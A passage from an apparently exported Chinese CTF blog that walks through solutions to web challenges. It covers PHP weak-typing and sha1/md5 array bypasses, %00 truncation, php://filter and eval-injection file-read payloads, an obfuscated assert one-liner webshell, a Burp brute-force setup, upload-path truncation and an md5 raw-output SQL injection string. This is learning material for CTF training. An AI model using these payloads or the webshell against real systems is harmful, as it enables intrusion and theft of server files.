substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\");&#125;else&#123; print \"never never never give up !!!\";&#125;?&gt; 分析1.id==0 用0==字符串绕过 因为有(!$_GET[‘id’])不能直接输入0 也可以用.绕过 即id=. 2.$data = @file_get_contents($a,’r’);$data==”bugku is a nice plateform!” 这个利用了file_get_contents的特性，当用到php://input的时候，file_get_contents支持字节流输入， 只要将a设为php://input,且post过去bugku is a nice plateform!即可 3.strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4 strlen对%00不截断，而eregi对%00截断，只要构造b=%00+大于4位的串即可(之所以要大于四位我感觉是因为在以get方式传参时%00被解码成了一个字符) 用hackbar即可 burp抓包改也是可以的 (记得把左上角的GET改成POST) (有时候burp会不成功 重新退出进下或许可以) 后来知道这破题直接访问f4l2a3g.txt也行… 120.24.86.145:8006/test/f4l2a3g.txt 也能看到flag 以下是对代码中函数或技巧的单独分析 substr($id,0,-1) substr — 返回字符串的子串就是截取字符串$id，获取从第一位到倒数第二位 0是第一位，-1是倒数第二位 stripos()查找字符串在另一字符串中第一次出现的位置（不区分大小写） 相关函数：strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写） .绕过接收参数 $a 得存在，并且 $a==0 可用. 绕过（非数字都可绕过） &lt;?php$a = $_GET[‘a’];if ($a == 0) { echo “1”;}if ($a) { echo “miao”;}?&gt; php://input接收参数中不能出现某一字符，但下面又必须使用可以 php:// 伪协议绕过 目前遇到的是 file_get_contents eregi%00 截断绕过 (这点还不太懂 Orz.) 有关php黑魔法(这玩意真是总结不完) 暗羽表姐的博客里也有不少关于这道题的总结http://www.zjicmisa.org/index.php/archives/112/ file_get_contents(“php://input”)和extract()123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\";&#125;else&#123;echo \"&lt;p&gt;sorry!&lt;/p&gt;\";&#125;&#125;?&gt; 先从file_get_contents(“php://input”)说前面题目中有过php中file_get_contents的特性可以使用字节流 再看另外一种方法extract()函数导致的变量覆盖漏洞 (但是这题不行 因为if (!empty($ac))这句) 首先介绍一下extract()函数的作用 extract() 函数从数组中将变量导入到当前的符号表 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量 来看一道很相似的题目 但是没有非空判断 1234567891011121314&lt;?php$filename='test.txt';extract($_GET);if(isset($attempt))&#123; $combination=trim(file_get_contents($filename)); if($attempt===$combination)&#123; echo \"&lt;p&gt;How did you know the secret combination was\" . \"$combinnation !?&lt;p&gt;\" ; $next = file_get_contents('password.txt'); echo \"&lt;p&gt;You've earned the password.\" . \"$next&lt;/p&gt;\"; &#125;else &#123; echo \"&lt;p&gt;Incorrect! The secret combiantion is not $attempt&lt;/p&gt;\"; &#125;&#125;?&gt; 首先注意 这里用的是 isset而不是empty isset()函数 一般用来检测变量是否设置 若变量不存在则返回 FALSE若变量存在且其值为NULL，也返回 FALSE若变量存在且值不为NULL，则返回 TURE同时检查多个变量时，每个单项都符合上一条要求时才返回 TRUE，否则结果为 FALSE empty()函数 判断值为否为空 若变量不存在则返回 TRUE若变量存在且其值为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 TURE若变量存在且值不为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 FALSE 在第三行, 运用了extract()函数, 将GET方式获得的变量导入到当前的符号表中 然后判断$attempt与$combination两个变量的内容是否相等. $combination变量储存的是test.txt的内容. 但是我们并不能查看test.txt, 所以并不知道该怎么去设 置$attempt的值. 但是, 由于extract()函数的不足之处, 导致这段代码存在一个变量覆盖漏洞 只要我们这样构造url/?attempt=&amp;filename= 那么, 我们可以发现, $attempt变量和$combination变量的内容都会被设置成空字符串 这样, Line 6 的判断就成立了, 我们就能成功地拿到password.txt的内容 话说变量覆盖漏洞还见过一种解法 有文件情况下直接读文件文件http://bobao.360.cn/news/detail/796.html 后记由此我想 file_get_contents是不是本身只能读文件 但是加上php://input 就可以 读post的数据？ file_get_contents()http://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp file_get_contents(“php://input”)http://blog.csdn.net/zhouminit/article/details/53044316 file_get_contents(“php://input”, “r”)http://blog.csdn.net/motian06/article/details/8207923 有待总结","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"杂七杂八的web","slug":"杂七杂八的web","date":"2017-10-03T08:30:49.000Z","updated":"2017-10-24T16:08:57.550Z","comments":true,"path":"2017/10/03/杂七杂八的web/","link":"","permalink":"http://Merl1ng.com/2017/10/03/杂七杂八的web/","excerpt":"burp 爆破","text":"burp 爆破 题目页面提示爆破 且为五位数密码 burp抓包 Send to Intruder 点击Positions 先点右侧 clear $ 清除所有变量 然后在你想爆破的位置点两个 Add $ 再到Payloads 先试试纯数字 再到 Options下 Number of threads 代表线程数 Number of retries on network 代表如果出现连接错误或其他网络问题,BurpSuite会放弃和移动之前重试的请求指定的次数 设置完后点击 Start attack开始爆破 按长度排一下 伪造登陆地址题目要求.NET FRAMEWORD 9.9框架 在英格兰地区 IE浏览器 对于.NET FRAMEWORD 9.9框架 可以查到在安装了.NET Framework后 MSI会将.NET CLR和版本号添加到UserAgent字符串中 抓包 所以要加上 .NET CLR 9.9 英国的话将语言改为 en-gb ie浏览器 MSIE 8.0; (版本号无所谓) 放包即可拿到flag 相关知识点Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)表示的含义为 Mozilla/5.0 一种浏览器的名称compatible 适合的;兼用的MSIE8.0 微软公司出品的IE浏览器8.0版本Windows NT 5.1 微软公司出品的服务器操作系统(xp)SV1=Security Version 1 安全版本1 题外话为什么IE浏览器的UA也是“Mozilla/4.0”打头的呢？第一轮浏览器大战最后以Netscape被收购，Internet Explorer独霸浏览器市场告终。而此时Mozilla的历史正是由这里开始。浏览器之战失利以后，Netscape并没有消失，为了挽回市场，1998年Netscape将浏览器的大部分代码开源，成立了一个组织，计划开发下一代的 Netscape浏览器，这个组织就是Mozilla.org，它的图标是一只恐龙。不久后，Netscape的源代码就差不多被全部抛弃， Mozilla社团开发出了在稳定性和功能上更出色的新一代浏览器。这个浏览器就是Mozilla Application Suite，简称Mozilla（Mozilla这个名字的来源是Mosaic和Godzilla（怪兽哥斯拉）两个词的结合，意为 “Mosaic终结者”。 起初，Mozilla是Netscape的吉祥物，也是Netscape Navigator浏览器使用的内部开发代号。由于Netscape早期的影响力，直到今天，所有浏览器包括IE，向Web服务器报告自己的浏览器标识的时候，都以 “Mozilla”开头，表明自己是Mozilla兼容的。 文件上传绕过这个的绕过方式比较奇怪 不是改文件名 而是修改文件的上传路径 因为先检查文件名后缀 所以文件名就为1.jpg 传上去之后还会再次检查文件后缀 又要求是php 所以这时只能再从文件上传的路径下手 改路径也是用到%00截断 但是不是直接打%00 因为 直接加%00相当于加了’%’’0’’0’这三个字符，但你实际需要做的是加入%00这个截断符 两种方法 其一是先打%00 curl+shift+u 利用burp自带的urlcode解码 其二是 进入hex 先找到1.php 即 70 68 70 (16进制) 在后面点 insert byte 之后效果是这样的 forward就可以啦 robots.txt很关键的一个技巧 但是容易忘 页面没啥下一步的提示时 试试robots.txt总没错 一句话利用题目说 送给大家一个过狗一句话&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt; http://120.24.86.145:8010/?s=phpinfo() 发现已经上传好了 可以直接利用 先尝试读取文件目录 ?s=system(‘ls’) 发现不行 改为 ?s=print_r(glob(“*”)) 123456789101112131415例子 1&lt;?phpprint_r(glob(\"*.txt\"));?&gt;输出类似：Array ( [0] =&gt; target.txt [1] =&gt; source.txt [2] =&gt; test.txt [3] =&gt; test2.txt )例子 2&lt;?phpprint_r(glob(\"*.*\"));?&gt;输出类似：Array ( [0] =&gt; contacts.csv [1] =&gt; default.php [2] =&gt; target.txt [3] =&gt; source.txt [4] =&gt; tem1.tmp [5] =&gt; test.htm [6] =&gt; test.ini [7] =&gt; test.php [8] =&gt; test.txt [9] =&gt; test2.txt ) 很明显要读取flag.txt里面的内容 ?s=print_r(file(flag.txt)) 不行 ?s=show_source(“flag.txt”) 成功 看到了flags 302重定向flag藏在302界面的响应头里 有关302可以看这篇 http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html php浮点数12345678$usera = ($_POST['userid']); if(isset($usera))&#123; if ($usera == \"1\")&#123; $usera = (int)($usera); if($usera == \"0\")&#123; header('Location: ./bhjskdfiffeswdwe.php'); &#125; &#125; hackbar里post userid=0.99999999999999999（小数点后至少有17位）即可满足代码跳转","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"burp","slug":"burp","permalink":"http://Merl1ng.com/tags/burp/"}]},{"title":"找源码的web题目","slug":"找源码的web题目","date":"2017-09-16T04:09:49.000Z","updated":"2017-10-20T04:28:19.064Z","comments":true,"path":"2017/09/16/找源码的web题目/","link":"","permalink":"http://Merl1ng.com/2017/09/16/找源码的web题目/","excerpt":"vim不正常退出","text":"vim不正常退出 这个知识点当年学长出过题目 卡死在前面少加了一个 . 心中一万个xxx 这几天做题终于又遇到了 vim不正常退出会产生一个xxx.xxx.swp文件 就是当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。 需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。 意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。 例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推 在浏览器输入的时候最前面一定要加一个. 当年惨痛的教训 了解这个知识点就可以解题了 题目是一个输入框 没啥想的 抓包看看 看到响应里的editor为vim 弹出一个窗口 提示 step2 的下一步地址 那就把地址输进去啊 但是发现step2的页面会马上自动跳转回step1 还得抓包 看到了submit.php 结合上面 很明显了 输入 .submit.php.swp 看到 代码审计 可以看出需要两个参数 email和token emailAddress在step2里可以看到 token初始化为0，但if语句中要让他长度为10，可以置为0000000000 所以构造submit.php?emailAddress=admin@simplexue.com&amp;token=0000000000 注意这里用的是submit.php file 远程文件包含漏洞发现链接http://120.24.86.145:8005/post/index.php?file=show.php 发现File参数 想到文件包含漏洞 故尝试读取php源码 并且题目提示flag在index里 故读取index.php PAYLOAD:http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php利用base64可以进行不可打印字符的读取 拿到base64加密的源码 再进行解密 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 看到了flag 本地包含题目代码为 123456 &lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; 由Request函数，可以想到文件包含，这里hello是可控的，那么，就可以构造包含语句 分析1.eval(php代码) 2.php代码=var_dump($a) 3.$a=@$_request[‘hello’] 4.$_request[‘hello’]=?hello=此处是你的输入文本 简单地说，你输入的所有内容最终会被包含在var_dump()里然后被eval解析。 所以这里你可以使用php函数，你使用函数读flag.php文件到$a，然后var_dump()输出。 或者从结构上做这道题，假如$a=);xxxxxx，那么eval这一行的内容就是：eval(“var_dump();xxxxxxxxx);”); 这里的xxxxxxx就可以是任意命令，比如是 );show_source(‘flag.php’);var_dump( 然后eval这一行就如下： eval(“var_dump();show_source(‘flag.php’);var_dump($a);”); 类似于一个字符串注入 当然 可改进为 ?hello=);show_source(‘flag.php’);// 即 eval(“var_dump();show_source(‘flag.php’);//);”); eval函数中，”” 内部为代码，//只在代码中起作用，相当于只注释了）； 最后贴一篇文件包含的文章http://www.2cto.com/article/201304/204158.html 最后的最后 又看到了两种方法 ?hello=file(“flag.php”) (好吧这种方法感觉比较奇葩) 还有一种 构造出文件包含 http://120.24.86.145:8003/?hello=);include $_POST[a];//a=php://filter/read=convert.base64-encode/resource=flag.php 读文件 cookie欺骗感觉挺好的一道题 学到了不少 题目 url http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= 至于题目页面显示的是一串很长的字符 后来发现没什么用 重点放在url上 filename 后的文件名是经过base64加密的 解密得到keys.txt 再测试line代表行数 结合起来就是显示出名为filename的文件的%d行代码 但是传文件名时要进行base64加密 那么尝试读取index.php 把其加密 得到aW5kZXgucGhw 但是我们不知道具体行数 这里应该写一个python脚本的 但是目前太菜了不会(捂脸) 好吧还是贴一个别人的脚本 1234567891011#coding:utf-8import requests,base64import rehtml=''url='http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw's=requests.Session()for i in range(100): content=s.get(url%i) if content.text=='': break html+=content.text 我就用burp的爆破方法 从行数为0试到100 再按长度排下序一行一行看(你把line参数删了也没用 默认只读出了第零行) 在按照最左侧序号从小到大排序 把每一行贴在一起得到 12345678910111213141516171819&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 就是加上一个cookie，让keys.php加入文件列表中，然后申请读取keys.php(注意是keys.php不是txt) 抓包 repeater 记得把keys.php base64加密 这里题目比较友好 line默认0行就读出来了 不然还得遍历 各种源码泄露https://www.secpulse.com/archives/55286.html 这里总结的挺全 遇到的是 .DS_Store文件泄漏 找到相应工具后利用拿到源码 flag就躺在里面","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"},{"name":"include","slug":"include","permalink":"http://Merl1ng.com/tags/include/"},{"name":"vim","slug":"vim","permalink":"http://Merl1ng.com/tags/vim/"},{"name":"cookie","slug":"cookie","permalink":"http://Merl1ng.com/tags/cookie/"}]},{"title":"php绕过补充","slug":"php绕过补充","date":"2017-09-01T04:27:22.000Z","updated":"2017-09-01T05:23:55.077Z","comments":true,"path":"2017/09/01/php绕过补充/","link":"","permalink":"http://Merl1ng.com/2017/09/01/php绕过补充/","excerpt":"在做题的过程中又遇到了一些 作为补充记录","text":"在做题的过程中又遇到了一些 作为补充记录 sha1()函数12345678910111213141516171819202122232425262728293031323334[php] view plain copy print?&lt;html&gt; &lt;head&gt; &lt;title&gt;level1&lt;/title&gt; &lt;link rel='stylesheet' href='style.css' type='text/css'&gt; &lt;/head&gt; &lt;body&gt; &lt;?php require 'flag.php'; if (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) print 'Your password can not be your name.'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else print '&lt;p class=\"alert\"&gt;Invalid password.&lt;/p&gt;'; &#125; ?&gt; &lt;section class=\"login\"&gt; &lt;div class=\"title\"&gt; &lt;a href=\"./index.txt\"&gt;Level 1&lt;/a&gt; &lt;/div&gt; &lt;form method=\"get\"&gt; &lt;input type=\"text\" required name=\"name\" placeholder=\"Name\"/&gt;&lt;br/&gt; &lt;input type=\"text\" required name=\"password\" placeholder=\"Password\" /&gt;&lt;br/&gt; &lt;input type=\"submit\"/&gt; &lt;/form&gt; &lt;/section&gt; &lt;/body&gt; &lt;/html&gt; 分析代码逻辑，发现GET了两个字段name和password，获得flag要求的条件是：name != password &amp; sha1(name) == sha1(password)，乍看起来这是不可能的，其实可以利用sha1()函数的漏洞来绕过。如果把这两个字段构造为数组，如：?name[]=a&amp;password[]=b，这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回false，if 条件成立，获得flag md5()函数同样可以 ereg()和strpos()原版123456789101112&lt;?php require 'flag.php'; if (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) echo 'You password must be alphanumeric'; else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag); else echo 'Invalid password'; &#125; ?&gt; 数组 ereg是只能处理字符串的，所以，按照原理，我们将password构造一个arr[]，传入之后，ereg是返回NULL的，===判断NULL和 FALSE，是不相等的，所以可以进入第二个判断，而strpos处理数组，也是返回NULL，注意这里的是!==，NULL!==FALSE,条件成 立，拿到flag 加强版1234567891011121314151617181920212223&lt;?phpif (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123; if (strpos ($_GET['password'], '*-*') !== FALSE) &#123; die('Flag: ' . $flag); &#125; else &#123; echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); &#125; &#125; else &#123; echo '&lt;p&gt;Invalid password&lt;/p&gt;'; &#125;&#125;?&gt; ereg判断是不是字母数字类型 判断是不是长度9999999 判断是不是有“-” 因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造1e8即100000000 &gt; 9999999 于是乎构造password=1e8%00-,成功得到答案 这里同上面构造 password[]=xxx也能过 十六进制与数字这个之前其实记录过 但还是再温习一下 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123; $flag = 'flag&#123;test&#125;'; $one = ord('1'); $nine = ord('9'); $number = '3735929054'; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return \"flase\"; &#125; &#125; if($number == $temp) return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 这里，它不让输入1到9的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，0x开 头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de，在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag。 数字运算（一）123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (\"POST\" == $_SERVER['REQUEST_METHOD']) &#123; $password = $_POST['password']; if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) &#123; echo 'Wrong Format'; exit; &#125; while (TRUE) &#123; $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); foreach ($ps as $pt) &#123; if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; &#125; if ($c &lt; 3) break; if (\"42\" == $password) echo $flag; else echo 'Wrong password'; exit; &#125; &#125;?&gt; 这里的意思就是：接收post参数password的值，必须满足12位以上字符，必须是非空格非TAB之外的内容，然后就是你的password要有大小写数字，字符内容，而且匹配到的次数要大于6次，最后才是这里的考点： 12if (\"42\" == $password) echo $flag; else echo 'Wrong password'; 最后的答案就是：42.00e+00000000000当然也可以这样：420.000000000e-1 42.00e+0000000000，10的00000次方。。等于42.000000…. 结果其实就是42 数字运算（二）12345678&lt;?php$flag = \"flag&#123;test&#125;\";$temp = \"1337a\";is_numeric($temp)?die(\"nope\"):NULL; if($temp&gt;1336)&#123; echo $flag;&#125; ?&gt; s代码中先将变量放到is_numeric函数中判断，如果数字或数字字符串则返回true，否咋返回false。然后一个判断，如果temp大于1336则显示flag。这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。如果输入一个1337a这样的字符串，在is_numeric中返回true，然后在比较时被转换成数字1337，这样就绕过判断输出flag md5()高级用法12345678910111213141516171819202122&lt;?php error_reporting(0);$link = mysql_connect('localhost', 'root', 'root');if (!$link) &#123; die('Could not connect to MySQL: ' . mysql_error()); &#125; // 选择数据库$db = mysql_select_db(\"security\", $link);if(!$db)&#123; echo 'select db error'; exit();&#125;// 执行sql$password = $_GET['password'];$sql = \"SELECT * FROM users WHERE password = '\".md5($password,true).\"'\";var_dump($sql);$result=mysql_query($sql) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );$row1 = mysql_fetch_row($result);var_dump($row1);mysql_close($link);?&gt; 这里的sql语句是 1$sql = \"SELECT * FROM users WHERE password = '\".md5($password,true).\"'\"; 其中md5运算函数有一个true参数，它的作用是将md5后的hex转换成字符串，这里如果后的字符串又单引号之类的字符就可以注入了。比如字符串：ffifdyop md5后，276f722736c95d99e921722cf9ed621c 将其转成字符串的话就是 可以看到起字符串类似于 ‘ or ‘6xxxxx 这样的字符串，其中’or’6是个永真的条件，如果把它放到查询中就可以进行where语句的判断，比如我们在url输入password=ffifdyop就可以看到dump出的数据","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"php代码审计","slug":"php代码审计","date":"2017-08-28T14:00:48.000Z","updated":"2017-10-04T13:18:27.665Z","comments":true,"path":"2017/08/28/php代码审计/","link":"","permalink":"http://Merl1ng.com/2017/08/28/php代码审计/","excerpt":"双url编码绕过","text":"双url编码绕过 12345678910111213141516&lt;?phpif(eregi(\"hackerDJ\",$_GET[id])) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"hackerDJ\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;\";&#125;?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? 主要涉及两个php函数 eregi 和 urldecode 查了一下 eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写 urlencode()函数原理就是首先把中文字符转换为十六进制，然后在每个字符前面加一个标识符% urldecode()函数与urlencode()函数原理相反，用于解码已编码的 URL 字符串，其原理就是把十六进制字符串转换为中文字符 所以这段php代码的大意就是以GET方式获取id 在id里查找有没有hackerDJ 有则不通过 并且要求urldecode解码后的id为hackerDJ 这样直接看上去是矛盾的 但是可以用URL编码绕过 hackerDJ转16进制后为 6861636b6572444a 加上%为 %68%61%63%6b%65%72%44%4a 但是这样 在题目url后输入?id=%68%61%63%6b%65%72%44%4a 会被浏览器直接解码 相当于还是输入了 ?id=hackerDJ 这显然是不行的 又了解到%的16进制但是25 所以我每个前面加上了 %25试了试 结果还是不行 当我输入?id=%25%68%25%61%25%63%25%6b%25%65%25%72%25%44%25%4a 浏览器的回显是 %25h%25a%25c%25k%25e%25r%25D%25J 这里比较奇怪 暂时还没有懂 于是再尝试另外一种方式 看到了一个大佬发的这个 双倍url编码 就是说想打/，一般编码一次是%5c 但攻击者怕这个会被认出来，所以用二次编码，把%本身编码成%25。再和后边拼成%255c。 如果URL解码器有缺陷，只不断重复“从前边开始解析”这个步骤，就会把这个先变回%5c，再变成/，出现循环解析。当然这是错误的。正确的只应该解一步变成%5c 抵抗父级目录回溯攻击，绝对不能依赖字符过滤，你过滤不完的。必须用“鸭子编程法”，先不论如何构造完整路径，再检验是否在有权的操作目录下 要正确进行URL解码，谨记使用PHP等语言提供的内部函数，切勿重复发明轮子 想到了 ?id=%2568%2561%2563%256b%2565%2572%2544%254a 成功拿到flag 变量(这个暂时没有完全理解) 1234567891011121314flag In the variable ! &lt;?php error_reporting(0);include \"flag1.php\"; //包含flag1.php这个文件highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; //正则表达式，匹配字符串，\\w表示字符+数字+下划线，+代表有若干个\\w字符组成 die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; $$args PHP中变量可以当作另一个变量的变量名 例如12345&lt;?php$a='b';$b=\"Boogle\";eval(\"var_dump($$a);\"); //输出 Boogle?&gt; 再看第一句提示： flag In the variable !//flag 在变量中 结合两者，可以想到一个很有意思的变量 $GLOBALS：一个包含了全部变量的全局组合数组 变量的名字就是数组的键 $GLOBALS是由所有已定义全局变量自动形成的数组。变量名就是该数组的索引 payload：?args=GLOBALS 即可爆出所有变量，其中包含flag array(7) { [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) { } [&quot;_GET&quot;]=&gt; array(1) { [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; } [&quot;_COOKIE&quot;]=&gt; array(0) { } [&quot;_FILES&quot;]=&gt; array(0) { } [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag{92853051ab894a64f7865cf3c2128b34}&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; } sha1绕过12345678910111213141516171819&lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 以前在博客记录过 sha1函数不能比较数组 会报错都返回 false 导致相等http://blog.merl1ng.cc/2017/09/01/php绕过补充/ 所以利用这个漏洞 注意 get和post方式 php反序列化1234567891011121314151617181920212223242526272829&lt;html&gt; &lt;head&gt; &lt;meta charset=utf8&gt; &lt;title&gt;最安全的管理系统&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;天网管理系统&lt;/h1&gt; &lt;p&gt;安全与你同在&lt;/p&gt; &lt;p&gt;账户:admin 密码:admin&lt;/p&gt; &lt;p&gt;就是这么光明正大的放置用户名和密码,爸爸说我们再也不会忘记密码啦。&lt;/p&gt; &lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;index.php&quot;&gt; &lt;table&gt; &lt;th&gt; &lt;td&gt;大家请放心使用我们的产品。&lt;/td&gt; &lt;/th&gt; &lt;tr&gt; &lt;td&gt;用户名:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密码:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot; value=&quot;admin&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;登入系统&quot;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;span style=&quot;color:#ff6666;&quot;&gt;&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt;&lt;/span&gt; &lt;/body&gt; &lt;/html&gt; 先是php弱类型 看到注释里面有一个提示，当传入的username值经md5加密后等于0，就会返回某样东西 只需要找到md5值为0exxx（xxx全为数字,共30位）(科学计数法) 传入s878926199a 它的md5 为0e545993274517709034328855841020 得到下一个页面的地址 访问得到 12345678$unserialize_str = $_POST['password']; $data_unserialize = unserialize($unserialize_str); if($data_unserialize['user'] == '???' &amp;&amp; $data_unserialize['pass']=='???') &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。回去吧骚年。 unserialize() 对单一的已序列化的变量进行操作，将其转换回反序列化 PHP 的值 返回的是转换之后的值，可为 integer、float、string、array 或 object 如果传递的字符串不可解序列化，则返回 FALSE，并产生一个 E_NOTICE 序列化与反序列化: 把复杂的数据类型压缩到一个字符串中 serialize() 把变量和它们的值编码成文本形式 unserialize() 恢复原先变量 分析 1.我们需要构造序列化的password填入，代码意思是把post提交的password值经过”反序列化”得到一个数组， 要求数组里的user和pass都等于某个值时就打印flag 2.加上代码提示布尔。 3.bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。 4.构造password: a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}（a代表array，s代表string，b代表bool，而数字代表个数/长度） 